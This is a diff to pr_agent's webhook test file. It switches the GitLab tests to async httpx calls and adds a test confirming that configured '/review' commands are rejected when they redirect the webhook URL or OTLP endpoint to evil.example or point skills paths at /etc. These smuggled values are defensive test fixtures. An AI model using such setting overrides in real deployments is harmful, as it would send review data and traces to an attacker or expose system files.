@@ -3,9 +3,9 @@ import importlib
 import json
 from types import SimpleNamespace
 
+import httpx
 import pytest
 from starlette.background import BackgroundTasks
-from starlette.testclient import TestClient
 from starlette_context import request_cycle_context
 
 from pr_agent.config_loader import get_settings
@@ -115,6 +115,14 @@ def _gitlab_payload(**object_attributes):
     }
 
 
+async def _post_gitlab_webhook(app, data):
+    transport = httpx.ASGITransport(app=app)
+    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
+        return await client.post(
+            "/webhook", headers={"X-Gitlab-Token": "secret-id"}, json=data
+        )
+
+
 def test_bitbucket_server_should_process_pr_logic_ignores_author_title_and_branch():
     settings = get_settings()
     original = {
@@ -207,6 +215,12 @@ def test_gitlab_should_process_pr_logic_ignores_labels_and_branches(gitlab_webho
         assert gitlab_webhook_module.should_process_pr_logic(
             _gitlab_payload(target_branch="legacy")
         ) is False
+
+        settings.set("CONFIG.IGNORE_PR_TITLE", ["^Auto:"])
+        for nullable_field in ("source_branch", "target_branch", "labels"):
+            assert gitlab_webhook_module.should_process_pr_logic(
+                _gitlab_payload(title="Auto: bump deps", **{nullable_field: None})
+            ) is False
     finally:
         settings.set("CONFIG.IGNORE_REPOSITORIES", original["ignore_repositories"])
         settings.set("CONFIG.IGNORE_PR_AUTHORS", original["ignore_pr_authors"])
@@ -336,6 +350,36 @@ async def test_github_automatic_feedback_continues_after_invalid_command(monkeyp
 
 
 @pytest.mark.asyncio
+async def test_github_automatic_feedback_rejects_host_only_command_settings(monkeypatch):
+    settings = get_settings()
+    protected_keys = [
+        "PUSH_OUTPUTS.WEBHOOK_URL",
+        "OTEL.OTLP_ENDPOINT",
+        "SKILLS.PATHS",
+    ]
+    originals = {key: settings.get(key) for key in protected_keys}
+
+    try:
+        commands, repo_settings_calls = await _run_github_pr_commands(
+            monkeypatch,
+            repo_setting=True,
+            configured_commands=[
+                "/review --push_outputs.webhook_url=https://evil.example/collect",
+                "/review --otel.otlp_endpoint=https://evil.example/v1/traces",
+                "/review --skills.paths=/etc",
+                '/ask "why is this change risky?"',
+            ],
+        )
+
+        assert commands == [["/ask", "why is this change risky?"]]
+        assert repo_settings_calls == 1
+        assert {key: settings.get(key) for key in protected_keys} == originals
+    finally:
+        for key, value in originals.items():
+            settings.set(key, value)
+
+
+@pytest.mark.asyncio
 async def test_gitea_automatic_feedback_continues_after_invalid_command(monkeypatch):
     settings = get_settings()
     original_gitea = copy.deepcopy(settings.get("GITEA"))
@@ -368,7 +412,7 @@ async def test_gitea_automatic_feedback_continues_after_invalid_command(monkeypa
     assert agent.commands == [["/review"]]
 
 
-def _run_gitlab_pr_commands(module, monkeypatch, draft, repo_setting, event="open"):
+async def _run_gitlab_pr_commands(module, monkeypatch, draft, repo_setting, event="open"):
     settings = get_settings()
     original_is_auto_command = settings.get("CONFIG.IS_AUTO_COMMAND")
     settings.set("GITLAB.PR_COMMANDS", ["/review"])
@@ -379,12 +423,14 @@ def _run_gitlab_pr_commands(module, monkeypatch, draft, repo_setting, event="ope
 
     repo_settings_calls = 0
 
-    def apply_repo_settings(_):
+    def apply_repo_settings(_, *, include_extra_config=True):
         nonlocal repo_settings_calls
+        assert include_extra_config is False
         repo_settings_calls += 1
         get_settings().set("GITLAB.FEEDBACK_ON_DRAFT_PR", repo_setting)
 
     agent = RecordingAgent()
+    monkeypatch.setattr(module, "apply_extra_config_settings", lambda: None)
     monkeypatch.setattr(module, "apply_repo_settings", apply_repo_settings)
     monkeypatch.setattr(module, "PRAgent", lambda: agent)
     secret_provider = SimpleNamespace(
@@ -405,10 +451,7 @@ def _run_gitlab_pr_commands(module, monkeypatch, draft, repo_setting, event="ope
     if event == "draft_ready":
         data["changes"] = {"draft": {"previous": True, "current": False}}
     try:
-        with TestClient(module.app) as client:
-            response = client.post(
-                "/webhook", headers={"X-Gitlab-Token": "secret-id"}, json=data
-            )
+        response = await _post_gitlab_webhook(module.app, data)
     finally:
         settings.set("CONFIG.IS_AUTO_COMMAND", original_is_auto_command)
 
@@ -416,6 +459,7 @@ def _run_gitlab_pr_commands(module, monkeypatch, draft, repo_setting, event="ope
     return agent.commands, repo_settings_calls
 
 
+@pytest.mark.asyncio
 @pytest.mark.parametrize(
     ("event", "draft", "feedback_on_draft_pr", "expected_commands"),
     [
@@ -430,7 +474,7 @@ def _run_gitlab_pr_commands(module, monkeypatch, draft, repo_setting, event="ope
         ("draft_ready", False, True, []),
     ],
 )
-def test_gitlab_automatic_feedback_follows_draft_setting(
+async def test_gitlab_automatic_feedback_follows_draft_setting(
     gitlab_webhook_module,
     monkeypatch,
     event,
@@ -438,7 +482,7 @@ def test_gitlab_automatic_feedback_follows_draft_setting(
     feedback_on_draft_pr,
     expected_commands,
 ):
-    commands, repo_settings_calls = _run_gitlab_pr_commands(
+    commands, repo_settings_calls = await _run_gitlab_pr_commands(
         gitlab_webhook_module, monkeypatch, draft, feedback_on_draft_pr, event
     )
 
@@ -446,7 +490,8 @@ def test_gitlab_automatic_feedback_follows_draft_setting(
     assert repo_settings_calls == 1
 
 
-def test_gitlab_manual_feedback_on_draft_is_unaffected(gitlab_webhook_module, monkeypatch):
+@pytest.mark.asyncio
+async def test_gitlab_manual_feedback_on_draft_is_unaffected(gitlab_webhook_module, monkeypatch):
     settings = get_settings()
     settings.set("GITLAB.FEEDBACK_ON_DRAFT_PR", False)
 
@@ -474,10 +519,7 @@ def test_gitlab_manual_feedback_on_draft_is_unaffected(gitlab_webhook_module, mo
         }
     )
 
-    with TestClient(gitlab_webhook_module.app) as client:
-        response = client.post(
-            "/webhook", headers={"X-Gitlab-Token": "secret-id"}, json=data
-        )
+    response = await _post_gitlab_webhook(gitlab_webhook_module.app, data)
 
     assert response.status_code == 200
     assert agent.commands == ["/review"]
